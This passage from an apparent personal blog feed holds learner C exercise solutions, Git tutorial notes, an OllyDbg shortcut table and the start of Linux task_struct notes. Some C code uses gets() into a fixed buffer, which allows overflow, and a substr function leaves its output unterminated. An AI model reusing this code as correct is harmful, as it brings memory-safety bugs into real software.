class="comment">* 时间：2022/3/20</span></span><br><span class="line"><span class="comment">* 分析：题目提示已经分析</span></span><br><span class="line"><span class="comment">* 总结：strcmp()比较两个字符串，</span></span><br><span class="line"><span class="comment">*两者相等返回0，不相等返回非0值</span></span><br><span class="line"><span class="comment">* 改进：可以将输出结果放在一个文件里</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 设置缓冲区，复制区</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">128</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">char</span> <span class="built_in">array</span>[<span class="number">128</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">gets(buffer);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">array</span>,buffer))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">array</span>,buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目六"><a class="markdownIt-Anchor" href="#题目六"></a> 题目六</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220321214104383.png" alt="6"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：提取子字符串</span></span><br><span class="line"><span class="comment">* 时间：2022/3/20</span></span><br><span class="line"><span class="comment">* 分析：题目提示已经分析</span></span><br><span class="line"><span class="comment">* 总结：</span></span><br><span class="line"><span class="comment">* 改进：增加判定函数是否执行，反馈输出提示</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">substr</span><span class="params">( <span class="type">char</span> dst[], <span class="type">char</span> src[], <span class="type">int</span> start, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> dst[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span> src[<span class="number">10</span>] = <span class="string">&quot;sbsbdsb&quot;</span>;</span><br><span class="line">substr(dst,src,<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,dst);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">substr</span><span class="params">( <span class="type">char</span> dst[], <span class="type">char</span> src[], <span class="type">int</span> start, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*start或len为负数*/</span></span><br><span class="line"><span class="keyword">if</span>( (start&lt;<span class="number">0</span>)||(len&lt;<span class="number">0</span>) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*指定位置超过src数组尾部*/</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>( src[i] != <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>( start&gt;i )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*提取字符串*/</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">&#123;</span><br><span class="line">dst[i] = src[start+i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目七"><a class="markdownIt-Anchor" href="#题目七"></a> 题目七</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220321221212816.png" alt="7"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：去除空格</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：见注释</span></span><br><span class="line"><span class="comment">* 总结：传数组名，相当于传指针，能通过函数修改实参</span></span><br><span class="line"><span class="comment">* 改进：增加判定函数是否执行，反馈输出提示，让用户自己输入数据</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deblank</span><span class="params">(<span class="type">char</span> <span class="built_in">string</span>[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> <span class="built_in">string</span>[<span class="number">10</span>] = <span class="string">&quot;s   bb &quot;</span>;</span><br><span class="line">deblank(<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deblank</span><span class="params">(<span class="type">char</span> <span class="built_in">string</span>[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 外层循环遍历数组，</span></span><br><span class="line"><span class="comment">    * 通过判断当前和下一字符是否为空格，</span></span><br><span class="line"><span class="comment">    * 来决定是否删除后一空格</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">string</span>[i] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">string</span>[i] == <span class="string">&#x27; &#x27;</span>) &amp;&amp; (<span class="built_in">string</span>[i + <span class="number">1</span>] == <span class="string">&#x27; &#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = i;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 删除实现：将第一个空格后面所有的字符向前挪动一位</span></span><br><span class="line"><span class="comment">            * 这里有个坑：当有三个连续空格时，如果不将i自减一位，</span></span><br><span class="line"><span class="comment">            *最后输出还是有两个连续的空格，</span></span><br><span class="line"><span class="comment">            *原因：忽略了第一次判断的空格。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">string</span>[j] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span>[j] = <span class="built_in">string</span>[j + <span class="number">1</span>];</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">            i--;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第四章编程题414&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第四章编程题414&quot;&gt;&lt;/a&gt; 第四章—编程题4.14&lt;/h1&gt;
&lt;h2 id=&quot;题目1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目1</summary>
      
    
    
    
    <category term="题库/作业" scheme="https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="C和指针" scheme="https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>Git快速入门</title>
    <link href="https://www.rgzzplus.com/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
    <id>https://www.rgzzplus.com/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</id>
    <published>2022-03-19T13:12:59.000Z</published>
    <updated>2022-03-19T13:27:48.461Z</updated>
    
    <content type="html"><![CDATA[<p>阅前提示：本文来自小甲鱼的<a href="https://www.bilibili.com/video/BV1bs411N7ny">极客Python之Git实用教程</a>总结，完全是我自己记得笔记，在这里分享给大家，如有不足和错误，请在评论区告诉我</p><h1 id="git-记录的是什么"><a class="markdownIt-Anchor" href="#git-记录的是什么"></a> Git 记录的是什么？</h1><p>Git 是将每个版本独立保存</p><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111133553859.png" alt="image-20220111133553859"></p><h1 id="工作区域-暂存区域和-git-仓库"><a class="markdownIt-Anchor" href="#工作区域-暂存区域和-git-仓库"></a> 工作区域、暂存区域和 Git 仓库</h1><p>​<strong>工作区（WORKING DIRECTORY）</strong>: 直接编辑文件的地方，肉眼可见直接操作；</p><p><strong>暂存区（STAGIN AREA）</strong>：数据（快照）暂时存放的地方；</p><p>**版本库（GIT DIRECTORT(RESPOSITORY)）：**存放已经提交的数据，push 的时候，就是把这个区的数据 push 到远程git仓库了。</p><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111133716264.png" alt="image-20220111133716264"></p><h1 id="git-工作流程"><a class="markdownIt-Anchor" href="#git-工作流程"></a> Git 工作流程</h1><ul><li><p>Git的工作流程一般是酱紫:</p><ol><li><p>在工作目录中添加、修改文件</p></li><li><p>将<strong>需要进行版本管理的文件</strong>放入暂存区域</p></li><li><p>将暂存区域的文件提交到Git仓库</p></li></ol></li><li><p>Git管理的文件有三种状态:</p><ul><li>已修改(modified)</li><li>已暂存(staged)</li><li>已提交(committed)</li></ul></li></ul><h1 id="实战"><a class="markdownIt-Anchor" href="#实战"></a> 实战</h1><ul><li><p>将工作目录的文件放到Git仓库只需要两步:</p><ul><li>git add 文件名   //添加文件</li><li>git commit -m &quot;你干了啥”    //提交并注释</li></ul></li><li><p>其它命令</p><ul><li>git status //查看状态</li><li>git log //查看历史提交的最终版本，即 <strong>commit实体</strong></li><li>reset  //撤回提交，即将最后一次存放到Git仓库里的文件撤回到暂存区</li><li>checkout  //从历史快照（或者暂存区域）中拷贝文件到工作目录</li></ul></li></ul><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111143815229.png" alt="image-20220111143815229"></p><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111144429661.png" alt="image-20220111144429661"></p><h1 id="几个命令的功能"><a class="markdownIt-Anchor" href="#几个命令的功能"></a> 几个命令的功能</h1><ul><li>add<ul><li>用于把工作目录的文件放入暂存区域</li></ul></li><li>commit<ul><li>用于把暂存区域的文件提交到 Git 仓库</li></ul></li><li>reset<ul><li>用于把 Git 仓库的文件还原到暂存区域</li></ul></li><li>checkout<ul><li>用于把暂存区域的文件还原到工作目录</li></ul></li></ul><h1 id="reset-命令选项危险"><a class="markdownIt-Anchor" href="#reset-命令选项危险"></a> reset 命令选项（危险）</h1><ul><li><p>git reset --mixed HEAD～</p><ul><li>移动 HEAD 的指向,将其指向上一个快照</li><li>将 HEAD 移动后指向的快照回滚到暂存区域</li></ul></li><li><p>git reset --soft HEAD～</p><ul><li>移动 HEAD 的指向,将其指向上一个快照</li></ul></li><li><p>git reset --hard HEAD~</p><ul><li>移动 HEAD 的指向,将其指向上一个快照</li><li>将 HEAD 移动后指向的快照回滚到暂存区域</li><li>将暂存区域的文件还原到工作目录</li></ul></li></ul><h2 id="reset-命令回滚快照三部曲"><a class="markdownIt-Anchor" href="#reset-命令回滚快照三部曲"></a> reset 命令回滚快照三部曲</h2><ol><li>移动 HEAD 的指向(–soft)</li><li>将快照回滚到暂存区域([–mixed]，默认)</li><li>将暂存区域还原到工作目录（–hard)</li></ol><h2 id="回滚个别文件"><a class="markdownIt-Anchor" href="#回滚个别文件"></a> 回滚个别文件</h2><ul><li>git reset 版本快照 文件名/路径<ul><li>HEAD 指针不会移动，回滚</li></ul></li><li>git reset 版本快照的 ID 号<ul><li>前滚</li></ul></li></ul><h1 id="比较"><a class="markdownIt-Anchor" href="#比较"></a> 比较</h1><h2 id="比较暂存区域与工作目录"><a class="markdownIt-Anchor" href="#比较暂存区域与工作目录"></a> 比较暂存区域与工作目录</h2><ul><li><p>git diff  //比较差异</p><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111162726582.png" alt="image-20220111162726582"></p></li><li><p>第二行</p><p>比较暂存区域和工作目录下的 <a href="http://README.md">README.md</a><br>a 代表暂存区域下的文件夹<br>b 代表工作区域下的文件夹</p></li><li><p>第三行</p><p>1a5af1f…20f3146 表示文件ID，<br>100644 指定文件类型和权限</p></li><li><p>第四行</p><p>— 三个减号，表示是旧文件存放在暂存区域</p></li><li><p>第五行<br>+++ 三个加号，表示是新文件存放在工作目录</p></li><li><p>第六行</p><p>中间的减号（-）代表旧文件，后面紧接着的数字代表开始行号，逗号后面的数字代表持续的行数</p></li><li><p>第七行<br>减号后面，代表删减的内容</p></li><li><p>第八行<br>加号后面，代表增加的内容</p></li><li><p>第九行<br>两个版本共有的内容</p></li><li><p>如果后面有冒号（：）代表文件内容未完全显示，需要输入命令查看或退出</p><ul><li>常用命令<ul><li>j 向下移动一行</li><li>f 向下移动一页</li><li>b 向上移动一页</li><li>d 向下移动半页</li><li>u 向上移动半页</li><li>g 跳到第一行</li><li>G 跳到最后一行</li><li>3g 跳到第3行</li><li>/ 从上往下搜索</li><li>? 从下往上搜索</li><li>/+搜索内容 按内容查找</li><li>h 显示帮助文档</li><li>q 退出</li></ul></li></ul></li></ul><h2 id="比较当前工作目录和-git-仓库中的快照"><a class="markdownIt-Anchor" href="#比较当前工作目录和-git-仓库中的快照"></a> 比较当前工作目录和 Git 仓库中的快照</h2><ul><li>git diff 快照ID</li></ul><h2 id="比较暂存区与-git-仓库中的快照"><a class="markdownIt-Anchor" href="#比较暂存区与-git-仓库中的快照"></a> 比较暂存区与 Git 仓库中的快照</h2><ul><li>git diff --cached 快照ID</li></ul><h2 id="终极奥义图"><a class="markdownIt-Anchor" href="#终极奥义图"></a> 终极奥义图</h2><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111171122255.png" alt="image-20220111171122255"></p><h1 id="修改最后一次提交"><a class="markdownIt-Anchor" href="#修改最后一次提交"></a> 修改最后一次提交</h1><ul><li><p>在实际开发中,你可能会遇到以下两种情景:</p><ul><li>情景一:版本刚一提交(commit）到仓库，突然想起漏掉两个文件还没有添加( add ) 。</li><li>情景二:版本刚一提交( commit）到仓库，突然想起版本说明写得不够全面，无法彰显你本次修改的重大意义…</li></ul></li><li><p>执行带 – amend 选项的 commit 提交命令, Git 就会 “更正” 最近的一次提交<br>git commit --amend</p></li></ul><h1 id="删除文件后恢复"><a class="markdownIt-Anchor" href="#删除文件后恢复"></a> 删除文件后恢复</h1><ul><li>git checkout --文件名<br>恢复已删除的文件</li></ul><h1 id="删除文件"><a class="markdownIt-Anchor" href="#删除文件"></a> 删除文件</h1><ul><li>git rm 文件名<ul><li>删除工作区域和暂存区域的文件，也就是取消跟踪，不纳入下一个版本管理，但不能删除已经提交在 git 仓库里的文件</li><li>git rm -f 文件名<ul><li>强制删除工作区域和暂存区域所有【文件名】文件，在工作目录和暂存区的同一个文件不同内容时使用</li></ul></li><li>git rm --cached 文件名<ul><li>只删除暂存区的文件</li></ul></li></ul></li><li>git reset --soft HEAD~<ul><li>soft 修改指针</li></ul></li></ul><h1 id="重命名文件"><a class="markdownIt-Anchor" href="#重命名文件"></a> 重命名文件</h1><ul><li>git mv 旧文件名 新文件名<ul><li>ren/mv 旧文件名 新文件名</li><li>git rm 旧文件名</li><li>git add 新文件名</li></ul></li></ul><h1 id="git-分支"><a class="markdownIt-Anchor" href="#git-分支"></a> Git 分支</h1><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111190210804.png" alt="image-20220111190210804"></p><h2 id="创建分支"><a class="markdownIt-Anchor" href="#创建分支"></a> 创建分支</h2><ul><li><p>git branch 分支名</p></li><li><p>切换分支前</p><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111191533654.png" alt="image-20220111191533654"></p></li></ul><h2 id="切换分支"><a class="markdownIt-Anchor" href="#切换分支"></a> 切换分支</h2><ul><li><p>git checkout 分支名</p><p>切换到feature分支后<br><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111191550366.png" alt="image-20220111191550366"></p></li></ul><h3 id="向-feature-分支添加内容后"><a class="markdownIt-Anchor" href="#向-feature-分支添加内容后"></a> 向 feature 分支添加内容后</h3><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111193039175.png" alt="image-20220111193039175"></p><h3 id="向-master-添加新内容后"><a class="markdownIt-Anchor" href="#向-master-添加新内容后"></a> 向 master 添加新内容后</h3><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111193407423.png" alt="image-20220111193407423"></p><ul><li>git log --oneline --graph --all<ul><li>以图形化显示所有分支</li></ul></li></ul><h2 id="合并和删除分支"><a class="markdownIt-Anchor" href="#合并和删除分支"></a> 合并和删除分支</h2><h3 id="实际开发中的分支"><a class="markdownIt-Anchor" href="#实际开发中的分支"></a> 实际开发中的分支</h3><p><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111194027008.png" alt="image-20220111194027008"></p><h3 id="合并分支"><a class="markdownIt-Anchor" href="#合并分支"></a> 合并分支</h3><ul><li>git merge 分支名</li></ul><h3 id="删除分支"><a class="markdownIt-Anchor" href="#删除分支"></a> 删除分支</h3><ul><li>git branch -d 分支名<ul><li>git branch --delete 分支名</li></ul></li></ul><h3 id="匿名分支"><a class="markdownIt-Anchor" href="#匿名分支"></a> 匿名分支</h3><h2 id="checkout-命令"><a class="markdownIt-Anchor" href="#checkout-命令"></a> checkout 命令</h2><h3 id="功能"><a class="markdownIt-Anchor" href="#功能"></a> 功能</h3><ol><li>从历史快照（或者暂存区域）中拷贝文件到工作目录<br>git checkout – <a href="http://README.md">README.md</a><br>加（–）是预防你恰好有一个 <a href="http://README.md">README.md</a> 的分支，产生矛盾</li><li>切换分支<br><img src="/2022/03/19/Git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/image-20220111201613854.png" alt="image-20220111201613854"></li></ol><h3 id="checkout-命令与-reset-命令区别"><a class="markdownIt-Anchor" href="#checkout-命令与-reset-命令区别"></a> checkout 命令与 reset 命令区别</h3><h4 id="恢复文件"><a class="markdownIt-Anchor" href="#恢复文件"></a> 恢复文件</h4><p><code>checkout</code> 命令和 <code>reset</code> 命令都可以用于恢复指定快照的指定文件，并且它们都不会改变 HEAD 指针的指向。</p><p>下面开始划重点∶</p><p>它们的区别是 <code>reset</code> 命令只将指定文件恢复到暂存区域（–mixed ），而 <code>checkout</code> 命令是同时覆盖暂存区域和工作目录。</p><p>注意∶也许你试图使用 <code>git reset --hard HEAD~README.md</code> 命令让 reset 同时覆盖工作目录，但 Git 会告诉你这是徒劳（此时 reset 不允许使用 --soft 或 --hard 选项)。</p><p>这样看来，在恢复文件方面，<code>reset</code> 命令要比 <code>checkout</code> 命令更安全一些。</p><h4 id="恢复快照"><a class="markdownIt-Anchor" href="#恢复快照"></a> 恢复快照</h4><p><code>reset</code> 命令是用来 “ 回到过去 ” 的，根据选项的不同，<code>reset</code>命令将移动 HEAD 指针 ( --soft ) -&gt;  覆盖暂存区域 ( --mixed，默认 ) -&gt;  覆盖工作目录 ( --hard )。</p><p><code>checkout</code> 命令虽说是用于切换分支，但前面你也看到了，它事实上也是通过移动 HEAD 指针和覆盖暂存区域、工作目录来实现的。</p><p>那问题来了:它们有什么区别呢?</p><p>下面开始划重点∶</p><p>第一个区别是，对于 <code>reset --hard</code> 命令来说，<code>checkout</code> 命令更安全。因为 checkout 命令在切换分支前会先检查一下当前的工作状态，如果不是 “clean” 的话，Git 不会允许你这样做；而 reset --hard 命令则是直接覆盖所有数据。</p><p>另一个区别是如何更新 HEAD 指向，<code>reset</code> 命令会移动 HEAD 所在分支的指向，而 <code>checkout</code> 命令只会移动 HEAD 自身来指向另一个分支。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;阅前提示：本文来自小甲鱼的&lt;a href=&quot;https://www.bilibili.com/video/BV1bs411N7ny&quot;&gt;极客Python之Git实用教程&lt;/a&gt;总结，完全是我自己记得笔记，在这里分享给大家，如有不足和错误，请在评论区告诉我&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Git" scheme="https://www.rgzzplus.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Ollydebug快捷键</title>
    <link href="https://www.rgzzplus.com/2022/03/19/Ollydebug%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>https://www.rgzzplus.com/2022/03/19/Ollydebug%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
    <published>2022-03-19T13:11:02.000Z</published>
    <updated>2022-03-19T13:12:27.305Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th style="text-align:center">按键</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">F2</td><td style="text-align:center">下断点，也就是指定端点的地址</td></tr><tr><td style="text-align:center">F3</td><td style="text-align:center">加载一个可执行程序，进行调试分析</td></tr><tr><td style="text-align:center">F4</td><td style="text-align:center">程序执行到光标处</td></tr><tr><td style="text-align:center">F5</td><td style="text-align:center">缩小、还原当前窗口</td></tr><tr><td style="text-align:center">F7</td><td style="text-align:center">单步步入</td></tr><tr><td style="text-align:center">F8</td><td style="text-align:center">单步步过</td></tr><tr><td style="text-align:center">F9</td><td style="text-align:center">直接运行程序，遇到断点处，程序暂停</td></tr><tr><td style="text-align:center">Ctrl+F2</td><td style="text-align:center">重新运行程序到起始处，一般用于重新调试程序</td></tr><tr><td style="text-align:center">Ctrl+F9</td><td style="text-align:center">执行到函数返回处，用于跳出函数实现</td></tr><tr><td style="text-align:center">Alt+F9</td><td style="text-align:center">执行到用户代码处，用于快速跳出系统函数</td></tr><tr><td style="text-align:center">Ctrl+G</td><td style="text-align:center">输入十六进制地址，快速定位到该地址处</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;按键&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="ollydebug" scheme="https://www.rgzzplus.com/tags/ollydebug/"/>
    
  </entry>
  
  <entry>
    <title>task_struct</title>
    <link href="https://www.rgzzplus.com/2022/03/19/task-struct/"/>
    <id>https://www.rgzzplus.com/2022/03/19/task-struct/</id>
    <published>2022-03-19T12:46:50.000Z</published>
    <updated>2022-03-19T13:27:38.600Z</updated>
    
    <content type="html"><![CDATA[<p>阅前提示：本文来自《LINUX内核设计与实现》第三章内容总结，如有不足和错误，请在评论区告诉我</p><h1 id="task_struct结构体"><a class="markdownIt-Anchor" href="#task_struct结构体"></a> task_struct结构体</h1><p>task_struct 被称为<strong>进程描述符</strong>，它定义在&lt;linux/sched.h&gt;文件中，进程描述符中包<strong>含一个具体进程的所有信息</strong>。</p><p>进程描述符中包含的数据能完整的描述一个正在执行的程序：程序打开的文件，进程的地址空间，挂起的信号，进程的状态，等等</p><p><img src="/2022/03/19/task-struct/image-20220306151727315.png" alt="image-20220306151727315"></p><h2 id="分配进程描述符"><a class="markdownIt-Anchor" href="#分配进程描述符"></a> 分配进程描述符</h2><p>Linux通过slab分配器分配 stak_struct 结构，目的是为了达到<strong>对象复用和缓存着色</strong>（注：通过预先分配和重复使用 task_struct，可以避免动态分配和释放所带来的资源消耗）。<strong>每个进程的 task_struct 存放在它们内核栈的栈尾。</strong></p><p><img src="/2022/03/19/task-struct/image-20220306154628782.png" alt="image-20220306154628782"></p><p>slab分配器在栈底（对于向下增长的栈来说）或栈顶（对于向上增长的栈来说）创建一个新的结构 struct thread_info，此结构中的 task域中存放指向该任务实际 task_struct的指针，以方便在汇编代码中计算其偏移。</p><p><img src="/2022/03/19/task-struct/image-20220306154716090.png" alt="image-20220306154716090"></p><h2 id="进程描述符的存放"><a class="markdownIt-Anchor" href="#进程描述符的存放"></a> 进程描述符的存放</h2><p>内核通过一个唯一的进程标识符（process identification value）或 PID 来表示每个进程。PID是一个最大默认值为 32768 的 